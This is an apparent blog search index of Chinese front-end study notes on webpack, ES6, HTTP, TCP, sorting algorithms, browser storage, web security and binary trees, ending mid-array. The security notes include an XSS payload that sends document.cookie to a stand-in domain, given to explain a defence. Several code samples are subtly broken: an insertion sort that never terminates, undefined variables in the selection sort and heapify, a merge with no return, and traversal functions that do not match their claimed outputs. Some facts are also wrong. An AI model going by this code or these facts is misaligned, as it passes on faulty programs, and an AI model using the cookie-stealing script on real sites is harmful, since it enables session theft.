<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[webpack]]></title>
    <url>%2F2018%2F09%2F26%2Fwebpack%2F</url>
    <content type="text"><![CDATA[一个前端资源加载/打包工具 安装yarn add webpack --dev npm install webpack --save-dev 处理文件html ==&gt; html-webpack-plugin, html单独打包成文件 脚本 ==&gt; babel + babel-preset-react(es6) 样式 ==&gt; css-loader + sass/less-loader 图片/字体 ==&gt; url-loader + file-loader extract-text-webpack-plugin 样式打包成单独文件 CommonsChunkPlugin 提出通用模块 webpack-dev-server 为webpack项目提供web服务 + 更改代码自动刷新 + 路径转发 配置创建一个配置文件webpack.config.js创建入口文件夹src app.js 输出const path = require(&apos;path&apos;) module.exports = { entry: &apos;./src/app.js&apos;, output: { path: path.resolve(__dirname, &apos;dist&apos;), // 生成打包目录 filename: &apos;app.js&apos; } } 配置html安卓html-webpack-plugin yarn add html-webpack-plugin --dev 在刚才的config里面引入 const HtmlWebpackPlugin = require(&apos;html-webpack-plugin&apos;) 在output下面加入 plugins: [ new HtmlWebpackPlugin({ // 这里存放配置项（其他配置可按照需求去官网搜索） template: &apos;./src/index.html&apos; // 给打包生成的html设置一个模版，也可以不设置，则自动生成html，会自动引入出口的js文件 }) ] 配置es6脚本安装babel-core / babel-preset-env / babel-loader yarn add babel-core babel-preset-env babel-loader --dev 在output下加一个module对象 module: { rules: [ { test: /\.js$/, exclude: /(node_modules)/, //排除（）内的文件夹 use: { loader: &apos;babel-loader&apos;, options: { presets: [&apos;env&apos;] } } } ] }]]></content>
  </entry>
  <entry>
    <title><![CDATA[react 第一次实战项目知识点记录]]></title>
    <url>%2F2018%2F09%2F26%2Freact%2F</url>
    <content type="text"><![CDATA[环境配置安装node.js（官网下载即可）node -v (查看是否安装node完成) 安装yarnsudo cnpm install yarn -g yarn -v（查看是否安装yarn完成） 使用git在马云上进行托管，并在本地clone下来项目git clone 你项目的地址 cd 你的项目 配置gitignore（git命令忽视）vim .gitignore i(编辑命令) .DS_Store (mac自带) node_modules (node包) dist (打包的压缩文件) *.log（错误信息等） 初始化项目yarn init 提交项目git add . （保存到暂存区） git commit -m &apos;备注信息&apos; （把暂存区内容保存到分支） git pull (拉取其他分支代码) git push (将更新内容提交进入远程分支) 安装webpack打包工具(配置规则查看webpack章节)yarn add webpack --dev 安装react的插件 yarn add babel-preset-react 在module的rule下的/\.js$/下的use下的options下的presets数组种填入[&apos;react&apos;]]]></content>
  </entry>
  <entry>
    <title><![CDATA[yarn(包管理工具，代替npm)]]></title>
    <url>%2F2018%2F09%2F26%2Fyarn%2F</url>
    <content type="text"><![CDATA[安装速度快，缓存机制强，本次安装一个包，缓存到本地，无需再次网络请求 与npm对比yarn npm yarn init npm init yarn npm install yarn global add ... npm install ... -g yarn add ... npm install ... -save yarn add ... --dev npm install ... --save-dev yarn remove ... npm uninstall ... --save(/dev) yarn run ... npm run ...]]></content>
  </entry>
  <entry>
    <title><![CDATA[es6小记]]></title>
    <url>%2F2018%2F09%2F20%2Fes6%2F</url>
    <content type="text"><![CDATA[变量与常量let 定义变量, const 定义常量，常量定义一次后，不可更改let r = 2 r = 4 console.log(r) r =====&gt; 4 const pi = 3.14 pi = 3.2 console.log(pi) 报错Assignment to constant variable. 不可重复定义var foo = 1 var foo = 2 console.log(foo) foo =====&gt; 2 let foo = 1 let foo = 2 console.log(foo) 报错Identifier &apos;foo&apos; has already 块级定义域事例 1: if (true) { var test = 1 } console.log(test) test =====&gt; 1 if (true) { let test1 = 1 } console.log(test1) 报错ReferenceError: test1 is not defined 事例 2: let arr = [1, 2, 3, 4] for (var i = 0; i &lt; arr.length; i++) { // do nothing } console.log(i) i =====&gt; 4 for (let j = 0; j &lt; arr.length; j++) { // do nothing } console.log(j) j =====&gt; ReferenceError: j is not defined 不存在变量提升console.log(names) var names = &apos;pig&apos; names ======&gt; undefined 因为var存在变量提示，实际代码操作如下： var names; console.log(names) names = &apos;pig&apos; console.log(age) let age = 10 age =====&gt; Identifier &apos;age&apos; has already been declared 箭头函数参数 =&gt; 表达式/语句let value1 = 1; let double = x =&gt; 2 * x; // x为参数 let treble = x =&gt; { return 3 * x; } console.log(double(value1)) =====&gt; 2 console.log(treble(value1)) =====&gt; 3 继承外层作用域，没有自己的this指针，没有独立作用域var obj = { commonFn: function () { console.log(this) }, arrowFn: () =&gt; { console.log(this) } } obj.commonFn() // this指向obj 输出： { commonFn: function () { }, arrowFn: () =&gt; { } } obj.arrowFn() // // this指向obj的作用域，也就是windows 输出： { window { ... } } 不能用作构造函数，不能用new生成一个对象let Animai = function () { } let animai = new Animai() animai =====&gt; Animai {} let Animai1 = () =&gt; { } let animai1 = new Animai1() animai1 =====&gt; 报错：Animai1 is not a constructor 没有prototype属性let commonFn = function () {} let arrowFn = () =&gt; {} console.log(commonFn.prototype) =====&gt; { constructor } console.log(arrowFn.prototype) =====&gt; undefined 模版字符串基本用法let str = ` &lt;div&gt; &lt;h1 class=&quot;title&quot;&gt;123&lt;/h1&gt; &lt;/div&gt; ` document.querySelector(&apos;body&apos;).innerHTML = str //html页面显示模版字符串的内容 添加变量let name = &apos;pig&apos; let str = ` &lt;div&gt; &lt;h1&gt;${name}&lt;/h1&gt; &lt;/div&gt; ` document.querySelector(&apos;body&apos;).innerHTML = str //html页面显示pig 添加方法let getName = () =&gt; { return &apos;my pig&apos; } let str = ` &lt;div&gt; &lt;h1&gt;${getName()}&lt;/h1&gt; &lt;/div&gt; ` document.querySelector(&apos;body&apos;).innerHTML = str //html页面显示my pig 循环遍历let arr = [&apos;pig&apos;, &apos;dog&apos;, &apos;duck&apos;] let str = ` &lt;ul&gt; ${ arr.map(name =&gt; `&lt;li&gt;I am ${name}&lt;/li&gt;`).join(&apos;&apos;) } &lt;/ul&gt; ` document.querySelector(&apos;body&apos;).innerHTML = str //html页面显示三个li，分别输出语句 I am pig / I am dog / I am duck promise基础用法new Promise((resolve, reject) =&gt; { // 异步函数 if (4 == 2) { resolve() } else { reject() } }).then((res) =&gt; { // resolve console.log(&apos;success&apos;, res) }, (err) =&gt; { // reject console.log(&apos;fail&apos;, err) }) 控制台输出：fail undefined 两个请求，一个请求成功后触发第二个请求，第二个请求成功后输出值var promise1 = new Promise((resolve, reject) =&gt; { if (6 &gt; 2) { resolve() } else { reject() } }) var promise2 = new Promise((resolve, reject) =&gt; { if (3 &gt; 2) { resolve() } else { reject() } }) promise1.then(() =&gt; { return promise2 }).then(() =&gt; { console.log(&apos;promise2 success&apos;) }) 控制台输出：promise2 success 面向对象-类基础用法class Animal { constructor (name) { this.name = &apos;animal&apos; this.myname = name } getName () { return this.name + &apos;,&apos; + this.myname } } let animal = new Animal(&apos;pig&apos;) // 实例化Animal的类 console.log(animal.getName()) // 控制台输出：animal，pig 类的继承class Animal { constructor () { this.name = &apos;animal&apos; } getName () { return this.name } } class Cat extends Animal{ constructor () { super() // 如果不加这行代码，会报错Must call super constructor in derived class before accessing &apos;this&apos; or returning from derived this.name = &apos;cat&apos; } } let animal = new Animal() let cat = new Cat() console.log(animal.getName()) =====&gt; animal console.log(cat.getName()) =====&gt; cat 对象的写法原本es5的写法 var name = &apos;pig&apos;, age = 18 var obj = { name: name, age: age, getName: function () { return this.name }, getAge: function () { return this.age } } console.log(obj.getName()) =====&gt; pig 现在es6的写法 let name = &apos;pig&apos;, age = 18 let obj = { name, //变量名可以直接用作对象的属性名称 age, getName () { //方法可以简写 return this.name }, [&apos;get&apos; + &apos;Age&apos;] () { //表达式作为属性名或者方法名 return this.age } } console.log(obj.getName()) =====&gt; pig console.log(obj.getAge()) =====&gt; 18 Object.keys // 获取对象的所有属性名，放回的是一个数组 Object.keys(obj) =====&gt; [‘name’, ‘age’, ‘getName’, ‘getAge’] Object.assign // 对象的整合 Object.assign({a: 1, b: 2}, {a: 3, b: 3, c: 5}) =====&gt; {a: 3, b: 3, c: 5} 模块化基本用法export： 导出模块的内容 let str = &apos;string&apos; let obj = { name: &apos;pig&apos; } export { str, obj } import： 在其他js文件获取模块的内容 import {str, obj, fn} from &apos;./module.js&apos; console.log(&apos;name&apos;, obj.name) =====&gt; &apos;pig&apos; console.log(&apos;str&apos;, str) =====&gt; &apos;string&apos; 默认输出/引用输出默认值： export default {a: 1} 引用默认值：（引用时可以使用任意名称接受传递过来的值） import foo from &apos;./module.js&apos; console.log(&apos;foo&apos;, foo)]]></content>
  </entry>
  <entry>
    <title><![CDATA[前端必会知识点（持续性更新）]]></title>
    <url>%2F2018%2F08%2F30%2Fknowledge%2F</url>
    <content type="text"><![CDATA[本章博客，梳理所有基础的css，js，html，jquery，vue等题，包含面试题，可供参考学习，也督促自我学习 前端和计算机基础相关知识1. 描述渐进增强和优雅降级之间的区别 渐进增强：在网页开发中，先对低版本的浏览器进行css样式处理，构建页面，满足最基本的功能，在对高级浏览器进行效果，交互。写法如下： .box { -webkit-border-radius: 2px; -moz-border-radius: 2px; border-radius: 2px; } 优雅降级：在网页开发中，先对高版本的浏览器进行css样式处理，构建页面，完善功能，在对低版本浏览器进行测试修复，完成基本功能。写法如下： .box { -moz-border-radius: 2px; border-radius: 2px; -webkit-border-radius: 2px; } 2. 浏览器兼容问题问题一：标签最低高度设置min-height不兼容 解决方案： { min-height: 200px; height: auto !important; height: 200px; overflow: visible; } 问题二：H5新标签在IE9以下的浏览器不识别 解决方案： &lt;!--[if It IE 9]--&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;js/html5shiv.js&quot;&gt;&lt;/script&gt; &lt;![endif]--&gt; html5shiv.js下载地址https://github.com/aFarkas/html5shiv/releases 问题三：被点击过的超链接不再具有hover和active属性 解决方案： 按照lvha的顺序书写css样式 “link”：a标签还未被访问的状态 “visited”：a标签已被访问过的状态 “hover”：鼠标悬浮在a标签上的状态 “active”：a标签被按着时的状态 3. 如何对网站的文件和资源进行优化？ 文件合并 第一种：将所有的js合并成一个大文件，所有的页面都引用。 优点：合并简单，使用也简单；缺点：页面可能会加载到本页面不使用的代码 第二种：各个页面合并生成自己所需js文件，生成多份js合并。 优点：每个页面都用到最精确的js，不会有不相关代码；缺点：公共部分无法使用缓存优化加载，会存在大量共同js代码的冗余。 第三种：合并公共大文件。 优点：公共部分得到加载优化，每个页面引用的也尽可能的做到了不冗余；缺点：可能会存在某些页面会引用到不需要的代码 文件压缩 1. 图片压缩css sprites 等 2. 文件上传压缩 3. 视频压缩等 使用cdn托管资源 CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。通过在网络各处放置节点服务器所构成的在现有的互联网基础之上的一层智能虚拟网络，CDN系统能够实时地根据网络流量和各节点的连接、负载状况以及到用户的距离和响应时间等综合信息将用户的请求重新导向离用户最近的服务节点上。其目的是使用户可就近取得所需内容，解决 Internet网络拥挤的状况，提高用户访问网站的响应速度。（百度百科） gizp压缩你的js和css文件 使用缓存 getStorage setStorage meta标签优化（title,description,keywords）、heading标签的优化(h1-h6)、alt优化 反向链接，网站外链接优化 网站外链一般称为导入链接/外部链接/网站反链/反向链接，通常称为外链和反链。 1.外链就是别的网站有指向到自己网站的链接 2.外链是唯一的站外优化操作方式 3.外链可以给你的网站带来可观的权重 4. 如何理解前后端分离？前端：负责View和Controller层。 后端：只负责Model层，业务处理/数据等。 5. 浏览器内核以及渲染引擎（1）内核Firefox使用Geoko——Mozilla自主研发的渲染引擎 Safari和Chrome都使用webkit。 （2）渲染引擎a）处理html生成DOM TREE b）处理css生成CSSDOM TREE c）DOM树与CSS-DOM树合并为Render树 d）对Render树进行布局计算 e）遍历Render树的每一个节点绘制到屏幕 6. 浏览器的加载顺序以及repaint/reflow加载顺序（1）输入网址，浏览器像服务器发出请求，服务器返回html文件 （2）浏览器载入html代码，发现head标签中有一个link引用了外部css文件 （3）浏览器又发起css文件请求，服务器返回这个css文件 （4）浏览器继续载入body部分的代码，而且css文件已经拿到，开始渲染页面 （5）浏览器在代码中发现一个引用img标签的图片，开始向服务器发出请求，浏览器继续渲染后续代码，不停止等待 （6）服务器返回图片文件，由于图片占用了一定的位置，影响了后面的排版布局，因此浏览器需要返回重新渲染代码 （7）浏览器发现javascript标签，运行外部js文件，浏览器发起请求，服务器返回js文件 （8）浏览器开始解析js代码，发现js中需要隐藏代码中的块（div...）,重新渲染代码 （9）如果更改页面布局和颜色搭配，浏览器重新请求css，重新渲染 回流reflow如果渲染树的结点发生了结构性变化，例如：宽高或者位置等，那么会触发回流reflow的逻辑。 重绘repaint如果渲染树的结点发生了非结构性的变化，例如：背景色等，会触发repaint重绘的逻辑。 document.body.style.padding = &quot;20px&quot; //reflow, repaint document.body.style.color = &apos;red&apos; //repaint 7. 如何加快HTML的加载速度（1）删除不必要的空格，注释 （2）减少文件数量，压缩文件 （3）减少域名查询，减少对外部的js，css和图片资源的引用 （4）缓存重用数据 （5）优化页面元素加载顺序，将图片，flash以及食品等资源最后加载 （6）使用合法标签，杜绝使用嵌套tables，在使用图像和tables时，应当设置大小。 8. 为什么使用多个域名来存储网络资源会更有效？1.CDN存储更方便 2.突破浏览器并发限制（同一时间针对同一域名下的请求有一定的数量限制） 3.节约cookie宽带 4.节约主域名的连接数，优化页面响应速度 5.防止不必要的安全问题 9. 进程与线程定义进程是具有一定独立功能的程序，是系统进行资源分配和调度的一个独立单位 线程是进程的一个实体，是CPU调度和分派的基本单位，基本上不拥有系统资源 关系一个线程可以创建和撤销另一个线程 同一个进程中的多个线程之间可以并发执行 区别1. 一个程序至少有一个进程，一个进程至少又一个线程 2. 线程的划分尺度小于进程，使得多线程程序的并发行高 3. 进程在执行过程中拥有独立的内存单元吗，而多个线程共享内存 4. 线程不能够独立执行，必须依存在应用程序中 优缺点线程执行开销小，但不利于资源的管理以及保护，进程相反 线程适合于在SMP及其上运行，进程可以跨机器迁移 （SMP：双/多CPU处理系统） 10. http与https区别httphttp是互联网上应用最为广泛的一种网络协议，是一个客户端和服务器端请求和应答的标准（TCP），用于从www服务器传输超文本到本地浏览器的传输协议，它可是使浏览器更加高效，使网络传输减少。 httpshttps是以安全为目标的http通道，简单讲是http的安全版，是由SSL+HTTP协议构建的可进行加密传输，身份认证的网络协议 客户端 服务器端 请求https连接 ------------------------------&gt; 返回证书（公钥） &lt;------------------------------ 产生随机（对称）密钥 使用公钥对对称钥加密 发送加密后的对称密钥 ------------------------------&gt; &lt;------------------------------ 发送加密后的对称密钥 ------------------------------&gt; &lt;------------------------------ 通过对称密钥加密的密文通信 ------------------------------&gt; &lt;------------------------------ 区别1. https协议需要到ca申请证书，一般免费证书比较少，因而需要一定费用 2. http是超文本传输协议，信息是明文传输，https则是具有安全性的ssl加密传输协议 3. http和https使用的是完全不同的连接方式，用的端口也不是一样，前者是80，后者是443 4. http连接很简单，无状态；https是需要加密传输，身份认证，比较安全 11. OSI七层协议 TCP/IP四层概念模型 对应网络协议OSI先有模型，后有协议，先有标准，后进行实践；而TCP/IP是先有协议和应用在提出了模型，参照OSI模型 OSI七层协议 TCP/IP四层概念模型 对应网络协议 应用层（application） 应用层 HTTP，TFTP，FTP，NFS，WAIS，SMTP 表示层（presentation） 应用层 Telent... 会话层（session） 应用层 SMTP，DNS 传输层（transport） 传输层 TCP，UDP 网络层（network） 网络层 IP... 数据链路层（Data Link） 数据链路层 FDDI... 物理层（physical） 数据链路层 IEEE 12. https在使用上有什么注意点1. 不能部分部署https，应当应用于所有页面，否则会存在sessionID被拦截 2. 部署https后，将任何普遍的http请求都重定向至https的url 3. 在cookies上设置安全标记 13. http与https的性能差距1. http进行tcp三次握手，而https进行tcp三次握手以及ssl握手，https的速度较http协议慢 2. https协议的计算耗时增加 14. 常见排序算法时间复杂度： 指执行算法所需要的计算工作量，也就是语句执行次数1.用常数1代替运行实践中的所有加法常数2.修改后的运行次数函数中，只保留最高阶级3.去除最高阶项的系数for: O(n) for+for: O(n^2) while: O(logn) 算法 最优复杂度 最差复杂度 平均复杂度 稳定性 冒泡排序 O(n^2) O(n^2) O(n^2) 稳定 插入排序 O(n) O(n^2) O(n^2) 稳定 选择排序 O(n^2) O(n^2) O(n^2) 不稳定 快速排序 O(nlogn) O(n^2) O(nlogn) 不稳定 希尔排序 O(n) O(n^2) O(n^1.4) 不稳定 归并排序 O(nlogn) O(nlogn) O(nlogn) 稳定 堆排序 O(nlogn) O(nlogn) O(nlogn) 稳定 冒泡排序每次将相邻的两个元素进行比较，将较小的元素放到前面 bubbleSort (arr) { for (let i = 0; i &lt; arr.length - 1; i ++) { for (let j = 0; j &lt; arr.length - i - 1; j++) { if (arr[j] &gt; arr[j + 1]) { let swap = arr[j] arr[j] = arr[j + 1] arr[j + 1] = swap } } } } 83 85 81 18 98 83 81 18 85 98 81 18 83 85 98 18 81 83 85 98 快速排序快速排序是冒泡排序的一种改进，第一趟排序时将数据分成两个部分，一个部分比另一个部分的所有数据都要小，然后递归调用，在两边都实现快速排序 quickSort (elements) { if (elements.length &lt;= 1) { return elements } let pivotIndex = Math.floor(elements.length / 2) let pivot = elements.splice(pivotIndex, 1)[0] // 删除中间值，形成新的数组并返回删除值 let left = [] let right = [] elements.forEach(item =&gt; { if (item &lt; pivot) { left.push(item) } else { right.push(item) } }) return quickSort(left).concat([pivot], quickSort(right)) } 29 39 13 33 30 12 34 14 13 12 14 29 39 33 30 34 12 13 14 29 33 30 34 39 12 13 14 29 30 33 34 39 插入排序从第一个元素开始，该元素可以认为已经被排序，取出下一个元素，在已经排序的元素序列中从后向前扫描，如果该元素大于新元素，将该元素移到下一个位置，知道找到已排序的元素小雨或者等于新元素的位置，将新元素插入到下一个位置中，继续扫描 sort (elements) { for (let i = 1; i &lt; elements.length; i++) { let key = elements[i] let j = i - 1 while (elements[j] &gt; key) { elements[j + 1] = elements[j] } elements[j + 1] = key } return elements } 20 19 21 34 53 11 31 49 58 19 20 21 34 53 11 31 49 58 11 19 20 21 34 53 31 49 58 11 19 20 21 31 34 53 49 58 11 19 20 21 31 34 49 53 58 选择排序在要排序的一组数中，选出最小的一个数与第一个数的位置交换，然后在剩下的数中再找最小的与第2的交换，知道由小到大排序为止 selectSort (elements) { for (let i = 0; i &lt; elements.length; i++) { let minIndex = i for (let j = i + 1; j &lt; elements.length; j++) { if (elements[j] &lt; arr[minIndex]) { minIndex = j } } let temp = elements[i] elements[i] = elements[minIndex] elements[minIndex] = temp } return elements } 20 19 21 34 53 11 31 49 58 11 19 21 34 53 20 31 49 58 11 19 20 34 53 21 31 49 58 11 19 20 21 53 34 31 49 58 11 19 20 21 31 34 53 49 58 11 19 20 21 31 34 49 53 58 希尔排序希尔排序是把记录按下标的一定增量分组，对每组使用直接插入排序算法排序，随着增量逐渐减少，每组包含的关键词越来越多，当增量减至1时，整个文件恰被分成一组，算法终止 shellArr (arr) { let len = arr.length, temp = 1, gap = 1 while (gap &lt; len / 5) { gap = gap * len + 1 } for (gap; gap &gt; 0; gap = Math.floor(gap / 5)) { for (let i = gap; i &lt; len; i ++) { temp = arr[i] for (let j = i - gap; j &gt;= 0 &amp;&amp; arr[j] &gt; temp; j -= gap) { arr[j + gap] = arr[j] } arr[j + gap] = temp } } return arr } 8 9 1 7 2 3 5 4 6 0 //gap = 10 / 5 = 2 =&gt; 分为五组，隔四个的两个值排序 3 5 1 6 0 8 9 4 7 2 //gap = 5 / 2 = 2 =&gt; 分为两组，隔一个的五个值进行直接插入排序 0 2 1 4 3 5 7 6 9 8 //gap = 2 / 2 = 1 =&gt; 一个一个插入排序 0 1 2 3 4 5 6 7 8 9 归并排序归并排序是一种稳定的排序方法，将已有序的子序列合并，得到完全有序的序列，即先使每个子序列有序，再使子序列段间有序 mergeSort (arr) { let len = arr.length if (len &lt; 2) { return arr } let middle = Math.floor(len / 2), left = arr.slice(0, middle), right = arr.slice(middle) return merge(mergeSort(left),mergeSort(right)) }//分 merge (left, right) { let result = [] while (left.length &amp;&amp; right.length) { if (left[0] &lt;= right[0]) { result.push(left.shift()) } else { result.push(right.shift()) } } while (left.length) { result.push(left.shift()) } while (right.length) { result.push(right.shift()) } } 8 9 1 7 2 3 5 4 6 0 8 9 7 1 2 3 4 5 0 6 8 9 1 2 7 3 4 0 5 6 1 2 7 8 9 0 3 4 5 6 0 1 2 3 4 5 6 7 8 9 堆排序堆排序可以把每一趟元素的比较结果保存下来，以便我们在选择最小/大元素时对已经比较过的元素做出相应调整。1.将长度为n的待排序的数组进行有序化构造成一个大顶堆2.将根结点与尾节点交换并输出此时的尾节点3.将剩余的n-1个节点重新进行堆有序化4.重复步骤2， 步骤3直至构造成一个有序列表 heapSort (arr) { let heapSize = arr.length, temp; for (let i = Math.floor(heapSize / 2) - 1; i &gt;= 0; i--) { heapify(arr, i, heapSize) } for (let j = heapSize - 1; j &gt;= 1; j--) { temp = arr[0] arr[0] = arr[j] arr[j] = temp; heapify(arr, 0, --heapSize) } return arr; } heapify (arr, x , len) { let l = 2 * x + 1, r = 2 * x + 2, largest = x, temp; if (l &lt; len &amp;&amp; arr[l] &gt; arr[largest]) { largest = 1 } if (r &lt; len &amp;&amp; arr[r] &gt; arr[largest]) { largest = r } if (largest != x) { temp = arr[x] arr[x] = arr[largest] arr[largest] = temp heapify(arr, lengest, len) } } 20 50 10 30 70 20 80 20 20 50 10 ====》 50 80 30 70 20 80 30 70 20 10 || || 80 20 70 20 《==== 70 80 30 50 20 10 30 50 20 10 || || 10 10 70 20 ====》 20 20 30 50 20 80 30 50 70 80 10 20 20 30 50 70 80 15.TCP握手协议TCP三次握手第一次握手：建立连接时，客户端发生syn包（syn=j）到服务器，并进入SYN_SEND状态，等待服务器确认； syn（同步序列编号） 第二次握手：服务器收到syn包，必须确认客户的syn（ack=j+1)，同时自己也发送一个syn包（syn=k），即syn+ack包，此时服务器进入syn_recv状态 第三次握手：客户端收到服务器的syn+ack包，向服务器发送确认包ack（ack=k+1),此包发送完毕，客户端和服务器进入established状态，完成三次握手 完成三次握手后，客户端与服务端开始传送数据 TCP四次握手（挥手）第一次挥手：客户端发送一个fin，用来关闭客户端到服务器端的数据传送，客户端进入fin_wait_1状态 第二次挥手：服务器收到fin后，发送一个ack，确认序号为收到的序号+1，和syn一样，一个fin占用一个序号 第三次挥手：服务器关闭与客户端a的连接，发送一个fin给客户端a 第四次挥手：客户端a发回ack报文确认，并将确认序号设置为收到序号+1 为什么建立协议是三次握手，关闭连接却是四次握手？这是因为服务器端的listen状态下的socket当收到syn报文的建连请求后，它可以把ack和syn（ack起应答作用，而syn起同步作用）放在一个报文里来发送，但关闭连接时，当收到对方的fin报文通知时，它仅仅表示对方没有数据发送给你，但未必你所有的数据全部发送给对方了，所以你可以未必会马上关闭socket，也即你可能还需要发送一些数据给对方之后买发送fin报文来表示你同意现在可以关闭连接了，所有他这里的ack报文和fin报文多数情况下都是分开发送的。 16.http请求头有哪儿些字段Accept: 浏览器能够处理的内容类型（ text/html, application/xhtml+xml ） Accept-Charset：浏览器能识别的字符集（ utf-8 ） Accept-Encoding：浏览器可以处理的编码方式（ gzip, deflate ） Accept-Language：浏览器接受的语言（ zh-CN ） Cookie：浏览器向服务器发送请求时发送cookie（ user=admin ） Content-Type：请求体中的内容的mime类型（ application/x-www-form-urlencoded ） Date：发送请求时的GMT时间（ Tue， 15 Nov 2018 14:43:37 GMT ） Host：被服务器的域名或IP地址（ Host：www.xxx.com:8080 ） Referer：指当前请求的URL是在什么地址引用的（ 点击超链接的请求的referer为当前超链接所在页面 ） 17.http响应头有哪儿些字段allow：对某网络资源的有效的请求行为 age：从原始服务器到代理缓存形成的估算时间（以秒计，非负） Access-Control-Allow-Headers: x-requested-with, Content-Type, Authorization, token Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS, DELETE Access-Control-Allow-Origin: * Access-Control-Max-Age: 3600 Content-Type: application/json;charset=UTF-8 Date: Wed, 19 Sep 2018 06:56:58 GMT Transfer-Encoding: 文件传输编码（ chunked ） 18.http1.1和http1.0的区别http1.0：每次请求和响应都需要建立一个单独的连接，每次连接只是传输一个对象，严重影响客户机和服务器的性能 http1.1：支持持久连接（keep-alive/close），在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟，增加了更多的请求头和响应头来改进和扩充http1.0的功能，增加了host请求投字段后，实现了在一台web服务器上可以在同一个ip地址和端口号上使用不同主机名来创建多个虚拟web站点，新增身份认证（authentication） 19.三种禁止浏览器缓存的头字段以及设置指Expires: 0 Cache-Control: no-cache Pragma: no-cache 20.常用的http状态码列表100: Continue，客户端应继续其请求 200: OK，请求成功，一般用于get与post请求 304: Not Modified，未修改，所请求的资源未修改，服务器返回此状态码时，不会返回任何资源，可以直接只用浏览器缓存 305: Use Proxy，使用代理，所请求的资源必须通过代理访问 400: Bad Request，客户端请求的语法错误，服务器无法理解 401: Unauthorized，请求要求用户的身份认证 403: Forbidden，服务器理解请求客户端的去部分请求，但是拒绝执行次请求 404: Not Found，服务器无法根据客户端的请求找到资源（网页） 500: Internal Server Error，服务器内部错误，无法完成请求 502: Bad Gateway，充当网管或代理的服务器，从远端服务器接收到了一个无效的请求 503: Service Unavailable，由于超载或系统维护，服务器暂时的无法处理客户端的请求 21.DNS-prefetchdns: 域名解析，将url地址的域名解析成ip地址 dns prefetch是一种dns预解析技术，当浏览网页时，浏览器会在加载网页时对网页中的域名进行解析缓存，这样在单击当前网页中的连接时就无需进行dns的解析，减少用户等待时间，提高用户体验 设置dns-prefetch开启 &lt;meta http-equiv=&quot;X-dns-prefetch-control&quot; content=&quot;on&quot; /&gt; 设置 &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//baidu.com&quot; /&gt; 使用//是为了防止不确定是http还是https协议 cookie sessionStorage localStoragecookie用于保存登陆信息，限制大小为4kb左右 设置cookie函数 let setCookie = (name, value, days) =&gt; { // name是设置cookie的名称 // value是设置对应cookie名称的内容 // days是设置cookie存储的过期时间 let date = new Date() date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000)) let expires = &quot;expires=&quot; + date.toGMTString() document.cookie = name + &apos;=&apos; + value + &apos;; &apos; + expires } 获取cookie值的函数 let getCookie = (cname) =&gt; { // 获取名称为name的cookie值 let name = cname + &apos;=&apos; let cookies = document.cookie.split(&apos;;&apos;) cookies.forEach((item) =&gt; { let c = item.trim() if (c.indexOf(name) == 0) { return c.substring(name.length, c.length) } }) return &quot;&quot; } 修改cookie，重新给cookie的名称赋值即可删除cookie，只需要设置expires参数为以前的时间即可 sessionStorageh5的绘画存储对象，用于临时保存同一窗口的数据，在关闭窗口后保存的数据删除，本地存储 设置session sessionStorage.setItem(key, value) 读取session sessionStorage.getItem(key) 移除单个session sessionStorage.removeItem(key) 移除所有session sessionStorage.clear() 与js数据对象的区别 js数据对象生命周期仅在当前页面有效，刷新就不存在了 而session是在窗口关闭后失效 localStorage（同一个域名共享，不可共享给两个域名）h5的本地存储，永久性存储，除非手动清除，不能被爬虫爬到 localStorage localStorage.setItem(key, value) 读取localStorage localStorage.getItem(key) 移除单个localStorage localStorage.removeItem(key) 移除所有localStorage localStorage.clear() 内容存满后的解决办法（当超出会报错，并且存不进去数据，也无法替换数据） 划分域名，各域名下的存储空间由各业务组统一规划使用 跨页面传数据，考虑单页应用 清除不需要缓存 三者异同特性 cookie localStorage sessionStorage 数据的生命周期 一般由服务器生成，可设置 除非被清除，永久有效 仅在当前对话下有效 失效时间，如果在浏览器端生 关闭页面后，清除 成cookie，默认是关闭浏览器 后失效 存放数据大小 4k左右 5MB 5MB 与服务器端通信 每次都会携带在http头中，如 仅在客户端（浏览器）中保存，不参与和服务器的通信 果使用cookie存储过多数据会 带来性能问题 易用性 需要自己封装，源生的cookie 源生接口可以接受，也可以自己封装 借口不友好 web安全性（前端）XSS攻击假设在一个文本框中输入 &lt;script&gt;window.location.href=&apos;MyDomain.com?cookie=&apos; + document.cookie&lt;/script&gt; 获取到了当前页面的cookie值，并传递给另一个网站下，所谓的钓鱼网站 解决方案 将重要的cookie标记为http only,这样js就无法通过document.cookie来获取 只允许用户输入我们期望的数据格式，数字就是数字 对数据进行html encode处理 过滤移除用户输入的特殊的标签：iframe，script等 过滤用户输入的事件标签：onclick，onfocus等 CSRF攻击（夸站点请求伪造）假设有一个请求是post，根据url传递参数就可以建立一个帖子 http://example.com/zzz/create.do?title=标题&amp;content=内容 而此时我更改传参，就会发布一个恶作剧的帖子 http://example.com/zzz/create.do?title=你是傻子么&amp;content=是的 解决办法 通过设置token来实现保护 当客户端请求页面时，服务器会生成一个随机数token，并且将token放到session中，然后将token发送给客户端，下次客户端提交请求时，token会随着表单一起提交到服务器端，通过判断验证token值，若相等，则不是伪造值 二叉树创建二叉树function Node (nodeData, leftData, rightData) { this.value = nodeData this.left = leftData this.right = rightData } function createTree (arr) { if (arr.length &lt;= 0) { return null } else { let mid = parseInt(arr.length / 2) let node = new Node(arr[mid], null, null) let leftArr = arr.slice(0, mid) let rightArr = arr.slice(mid + 1, arr.length) node.left = createTree(leftArr) node.right = createTree(rightArr) return node } } let arrList = [1,2,3,4,5,6,12,10,9,7] console.log(createTree(arrList)) 前序排列(中左右)var leftArr = [] var leftOrder = (tree) =&gt; { if (tree) { leftArr.push(tree.value) leftOrder(tree.left) leftOrder(tree.right) } } console.log(leftArr) =&gt; [6, 3, 2, 1, 5, 9, 10, 12, 7] 中序排列(左中右)var midArr = [] var midOrder = (tree) =&gt; { if (tree) { midArr.push(tree.value) midOrder(tree.left) midOrder(tree.right) } } console.log(midArr) =&gt; [1, 2, 3, 5, 6, 12, 10, 9, 7] 后序排列(左右中)var rightArr = [] var rightOrder = (tree) =&gt; { if (tree) { rightArr.push(tree.value) rightOrder(tree.left) rightOrder(tree.right) } } console.log(rightArr) =&gt; [1, 2, 5, 3, 12, 10, 7, 9, 